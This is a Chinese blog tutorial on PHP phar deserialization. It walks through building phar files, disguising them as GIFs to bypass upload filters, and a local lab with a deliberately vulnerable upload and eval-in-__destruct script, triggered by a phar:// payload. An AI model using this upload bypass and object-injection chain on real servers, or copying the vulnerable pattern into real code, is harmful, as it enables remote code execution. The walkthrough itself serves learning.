@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.1">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.1" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.1">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '7.4.1',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Copy',
+      copy_success: 'Copied',
+      copy_failure: 'Copy failed'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="概要来自Secarma的安全研究员Sam Thomas发现了一种新的漏洞利用方式，可以在不使用php函数unserialize()的前提下，引起严重的php对象注入漏洞。这个新的攻击方式被他公开在了美国的BlackHat会议演讲上，演讲主题为：”不为人所知的php反序列化漏洞”。它可以使攻击者将相关漏洞的严重程度升级为远程代码执行。我们在RIPS代码分析引擎中添加了对这种新型攻击的检测。 关于流包">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初探phar反序列化">
+<meta property="og:url" content="http://yoursite.com/2019/10/16/初探phar反序列化/index.html">
+<meta property="og:site_name" content="死鬼快来看我">
+<meta property="og:description" content="概要来自Secarma的安全研究员Sam Thomas发现了一种新的漏洞利用方式，可以在不使用php函数unserialize()的前提下，引起严重的php对象注入漏洞。这个新的攻击方式被他公开在了美国的BlackHat会议演讲上，演讲主题为：”不为人所知的php反序列化漏洞”。它可以使攻击者将相关漏洞的严重程度升级为远程代码执行。我们在RIPS代码分析引擎中添加了对这种新型攻击的检测。 关于流包">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180908164942-210cf44c-b344-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180908164942-211fe3fe-b344-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180908164943-213f55b8-b344-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180908164943-2151deae-b344-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180908164943-216caf36-b344-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180908164943-217a6b4e-b344-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180908164943-2183f114-b344-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180908164943-2192a600-b344-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180908164944-21d8d5b2-b344-1.png">
+<meta property="og:updated_time" content="2019-10-16T11:59:32.813Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="初探phar反序列化">
+<meta name="twitter:description" content="概要来自Secarma的安全研究员Sam Thomas发现了一种新的漏洞利用方式，可以在不使用php函数unserialize()的前提下，引起严重的php对象注入漏洞。这个新的攻击方式被他公开在了美国的BlackHat会议演讲上，演讲主题为：”不为人所知的php反序列化漏洞”。它可以使攻击者将相关漏洞的严重程度升级为远程代码执行。我们在RIPS代码分析引擎中添加了对这种新型攻击的检测。 关于流包">
+<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180908164942-210cf44c-b344-1.png">
+  <link rel="canonical" href="http://yoursite.com/2019/10/16/初探phar反序列化/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>初探phar反序列化 | 死鬼快来看我</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+  
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">死鬼快来看我</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+        
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+      
+    
+  </ul>
+
+    
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/16/初探phar反序列化/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="su33er">
+      <meta itemprop="description" content="同志###我要向你学习!">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="死鬼快来看我">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            初探phar反序列化
+            
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              
+                
+              
+
+              <time title="Created: 2019-10-16 19:57:13 / Modified: 19:59:32" itemprop="dateCreated datePublished" datetime="2019-10-16T19:57:13+08:00">2019-10-16</time>
+            </span>
+          
+            
+
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h1><p>来自Secarma的安全研究员Sam Thomas发现了一种新的漏洞利用方式，可以在不使用php函数unserialize()的前提下，引起严重的php对象注入漏洞。<br>这个新的攻击方式被他公开在了美国的BlackHat会议演讲上，演讲主题为：”不为人所知的php反序列化漏洞”。它可以使攻击者将相关漏洞的严重程度升级为远程代码执行。我们在RIPS代码分析引擎中添加了对这种新型攻击的检测。</p>
+<h1 id="关于流包装"><a href="#关于流包装" class="headerlink" title="关于流包装"></a>关于流包装</h1><p>大多数PHP文件操作允许使用各种URL协议去访问文件路径：如<code>data://</code>，<code>zlib://</code>或<code>php://</code>。<br>例如常见的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include(&apos;php://filter/read=convert.base64-encode/resource=index.php&apos;);</span><br><span class="line">include(&apos;data://text/plain;base64,xxxxxxxxxxxx&apos;);</span><br></pre></td></tr></table></figure>
+
+<p><code>phar://</code>也是流包装的一种</p>
+<h1 id="phar原理"><a href="#phar原理" class="headerlink" title="phar原理"></a>phar原理</h1><h2 id="a-stub"><a href="#a-stub" class="headerlink" title="a stub"></a>a stub</h2><p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
+<h2 id="官方手册"><a href="#官方手册" class="headerlink" title="官方手册"></a>官方手册</h2><p>phar的本质是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180908164942-210cf44c-b344-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908164942-210cf44c-b344-1.png" alt="img"></a></p>
+<h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作</p>
+<p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</strong></p>
+<p>phar.php:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">    $o = new TestObject();</span><br><span class="line">    $o -&gt; data=&apos;hu3sky&apos;;</span><br><span class="line">    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">    //签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问后,会生成一个phar.phar在当前目录下。<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180908164942-211fe3fe-b344-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908164942-211fe3fe-b344-1.png" alt="img"></a><br>用winhex打开<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180908164943-213f55b8-b344-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908164943-213f55b8-b344-1.png" alt="img"></a><br>可以明显的看到meta-data是以序列化的形式存储的。<br>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180908164943-2151deae-b344-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908164943-2151deae-b344-1.png" alt="img"></a></p>
+<p>phar_fan.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TestObject&#123;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this -&gt; data;   // TODO: Implement __destruct() method.</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">include(&apos;phar://phar.phar&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输出<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180908164943-216caf36-b344-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908164943-216caf36-b344-1.png" alt="img"></a></p>
+<h1 id="将phar伪造成其他格式的文件"><a href="#将phar伪造成其他格式的文件" class="headerlink" title="将phar伪造成其他格式的文件"></a>将phar伪造成其他格式的文件</h1><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    $phar = new Phar(&apos;phar.phar&apos;);</span><br><span class="line">    $phar -&gt; startBuffering();</span><br><span class="line">    $phar -&gt; setStub(&apos;GIF89a&apos;.&apos;&lt;?php __HALT_COMPILER();?&gt;&apos;);   //设置stub，增加gif文件头</span><br><span class="line">    $phar -&gt;addFromString(&apos;test.txt&apos;,&apos;test&apos;);  //添加要压缩的文件</span><br><span class="line">    $object = new TestObject();</span><br><span class="line">    $object -&gt; data = &apos;hu3sky&apos;;</span><br><span class="line">    $phar -&gt; setMetadata($object);  //将自定义meta-data存入manifest</span><br><span class="line">    $phar -&gt; stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180908164943-217a6b4e-b344-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908164943-217a6b4e-b344-1.png" alt="img"></a></p>
+<p>采用这种方法可以绕过很大一部分上传检测。</p>
+<h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><h2 id="phar文件要能够上传到服务器端。"><a href="#phar文件要能够上传到服务器端。" class="headerlink" title="phar文件要能够上传到服务器端。"></a>phar文件要能够上传到服务器端。</h2><p>如<code>file_exists()</code>，<code>fopen()</code>，<code>file_get_contents()</code>，<code>file()</code>等文件操作的函数</p>
+<h2 id="要有可用的魔术方法作为“跳板”。"><a href="#要有可用的魔术方法作为“跳板”。" class="headerlink" title="要有可用的魔术方法作为“跳板”。"></a>要有可用的魔术方法作为“跳板”。</h2><h2 id="文件操作函数的参数可控，且-、-、phar等特殊字符没有被过滤。"><a href="#文件操作函数的参数可控，且-、-、phar等特殊字符没有被过滤。" class="headerlink" title="文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。"></a>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</h2><h1 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload_file.php`，后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif</span><br><span class="line">`upload_file.html` 文件上传表单</span><br><span class="line">`file_un.php` 存在`file_exists()`，并且存在`__destruct()</span><br></pre></td></tr></table></figure>
+
+<h2 id="文件内容"><a href="#文件内容" class="headerlink" title="文件内容"></a>文件内容</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">upload_file.php</span><br><span class="line">&lt;?php</span><br><span class="line">if (($_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;)&amp;&amp;(substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &apos;.&apos;)+1))== &apos;gif&apos;) &#123;</span><br><span class="line">    echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">    echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;];</span><br><span class="line">    echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line"></span><br><span class="line">    if (file_exists(&quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))</span><br><span class="line">      &#123;</span><br><span class="line">      echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;</span><br><span class="line">      &#125;</span><br><span class="line">    else</span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],</span><br><span class="line">      &quot;upload_file/&quot; .$_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">      echo &quot;Stored in: &quot; . &quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">else</span><br><span class="line">  &#123;</span><br><span class="line">  echo &quot;Invalid file,you can only upload gif&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">upload_file.html</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://localhost/upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;Upload&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">file_un.php</span><br><span class="line">&lt;?php</span><br><span class="line">$filename=$_GET[&apos;filename&apos;];</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var $output = &apos;echo &quot;ok&quot;;&apos;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($filename);</span><br></pre></td></tr></table></figure>
+
+<h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><p>首先是根据file_un.php写一个生成phar的php文件，当然需要绕过gif，所以需要加GIF89a，然后我们访问这个php文件后，生成了phar.phar，修改后缀为gif，上传到服务器，然后利用file_exists，使用<code>phar://</code>执行代码</p>
+<h2 id="构造代码"><a href="#构造代码" class="headerlink" title="构造代码"></a>构造代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">eval.php</span><br><span class="line">&lt;?php</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var $output = &apos;echo &quot;ok&quot;;&apos;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar = new Phar(&apos;phar.phar&apos;);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(&apos;GIF89a&apos;.&apos;&lt;?php __HALT_COMPILER();?&gt;&apos;);</span><br><span class="line">$phar -&gt; addFromString(&apos;test.txt&apos;,&apos;test&apos;);</span><br><span class="line">$object = new AnyClass();</span><br><span class="line">$object -&gt; output= &apos;phpinfo();&apos;;</span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure>
+
+<p>访问eval.php，会在当前目录生成phar.phar，然后修改后缀 gif<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180908164943-2183f114-b344-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908164943-2183f114-b344-1.png" alt="img"></a><br>接着上传,文件会上传到upload_file目录下<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180908164943-2192a600-b344-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908164943-2192a600-b344-1.png" alt="img"></a><br>然后利用file_un.php。<br>payload:filename=phar://upload_file/phar.gif</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180908164944-21d8d5b2-b344-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908164944-21d8d5b2-b344-1.png" alt="img"></a></p>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/10/16/php反序列化学习/" rel="next" title="php反序列化学习">
+                  <i class="fa fa-chevron-left"></i> php反序列化学习
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+        
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#概要"><span class="nav-number">1.</span> <span class="nav-text">概要</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#关于流包装"><span class="nav-number">2.</span> <span class="nav-text">关于流包装</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#phar原理"><span class="nav-number">3.</span> <span class="nav-text">phar原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#a-stub"><span class="nav-number">3.1.</span> <span class="nav-text">a stub</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#官方手册"><span class="nav-number">3.2.</span> <span class="nav-text">官方手册</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#demo"><span class="nav-number">4.</span> <span class="nav-text">demo</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#将phar伪造成其他格式的文件"><span class="nav-number">5.</span> <span class="nav-text">将phar伪造成其他格式的文件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用条件"><span class="nav-number">6.</span> <span class="nav-text">利用条件</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#phar文件要能够上传到服务器端。"><span class="nav-number">6.1.</span> <span class="nav-text">phar文件要能够上传到服务器端。</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#要有可用的魔术方法作为“跳板”。"><span class="nav-number">6.2.</span> <span class="nav-text">要有可用的魔术方法作为“跳板”。</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件操作函数的参数可控，且-、-、phar等特殊字符没有被过滤。"><span class="nav-number">6.3.</span> <span class="nav-text">文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞验证"><span class="nav-number">7.</span> <span class="nav-text">漏洞验证</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境准备"><span class="nav-number">7.1.</span> <span class="nav-text">环境准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件内容"><span class="nav-number">7.2.</span> <span class="nav-text">文件内容</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实现过程"><span class="nav-number">7.3.</span> <span class="nav-text">实现过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#构造代码"><span class="nav-number">7.4.</span> <span class="nav-text">构造代码</span></a></li></ol></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">su33er</p>
+  <div class="site-description" itemprop="description">同志###我要向你学习!</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+        
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">su33er</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">
+      
+    Theme – <a href="https://muse.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.4.1
+  </div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+  
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.1"></script><script src="/js/motion.js?v=7.4.1"></script>
+<script src="/js/schemes/muse.js?v=7.4.1"></script>
+<script src="/js/next-boot.js?v=7.4.1"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+
+</body>
+</html>
